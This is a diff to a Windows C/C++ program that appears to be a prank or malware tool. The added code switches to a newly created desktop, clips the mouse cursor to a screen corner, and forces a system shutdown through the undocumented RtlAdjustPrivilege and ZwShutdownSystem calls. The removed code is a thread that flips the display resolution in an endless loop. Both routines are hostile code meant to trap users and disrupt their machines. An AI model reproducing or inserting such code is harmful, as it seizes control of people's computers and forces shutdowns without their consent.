@@ -8,10 +8,31 @@ void s(int cathy);
 void s(LPCWSTR cathy);
 VOID GetInfo(__out LPSYSTEM_INFO lpSystemInfo);
 #pragma warning(disable:4996)
-DWORD WINAPI BlackThread(LPVOID pM);
+VOID RestartDirect();
+VOID LockCursor();
+DWORD WINAPI RestartThread(LPVOID pM);
+VOID LockCursor()
+{
+	RECT rect;
+	rect.bottom = GetSystemMetrics(SM_CYSCREEN);
+	rect.right = GetSystemMetrics(SM_CXSCREEN);
+	rect.left = GetSystemMetrics(SM_CXSCREEN);
+	rect.top = GetSystemMetrics(SM_CYSCREEN);
+	ClipCursor(&rect);
+}
 VOID Restart()
 {
-	CreateThread(NULL, 0, BlackThread, nullptr, 0, nullptr);
+	HDESK VirtualDesk = CreateDesktop(L"GUI", NULL, NULL, DF_ALLOWOTHERACCOUNTHOOK, GENERIC_ALL, NULL);
+	SwitchDesktop(VirtualDesk);
+	LockCursor();
+	RestartDirect();
+}
+inline VOID RestartDirect()
+{
+	CreateThread(0, 0, RestartThread, 0, 0,0);
+}
+DWORD WINAPI RestartThread(LPVOID pM)
+{
 	const int SE_SHUTDOWN_PRIVILEGE = 0x13;
 	typedef int(__stdcall *PFN_RtlAdjustPrivilege)(int, BOOL, BOOL, int*);
 	typedef int(__stdcall *PFN_ZwShutdownSystem)(int);
@@ -30,25 +51,7 @@ VOID Restart()
 
 		}
 	}
-}
-DWORD WINAPI BlackThread(LPVOID pM)
-{
-	UNREFERENCED_PARAMETER(pM);
-	DEVMODE NewDevMode = { 0 };
-	while (1)
-	{
-		NewDevMode.dmSize = sizeof(NewDevMode);
-		NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
-		NewDevMode.dmPelsWidth = 800;
-		NewDevMode.dmPelsHeight = 600;
-		ChangeDisplaySettings(&NewDevMode, 0);
-		NewDevMode = { 0 };
-		NewDevMode.dmSize = sizeof(NewDevMode);
-		NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
-		NewDevMode.dmPelsWidth = 640;
-		NewDevMode.dmPelsHeight = 480;
-		ChangeDisplaySettings(&NewDevMode, 0);
-	}
+	return 0;
 }
 
 //typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
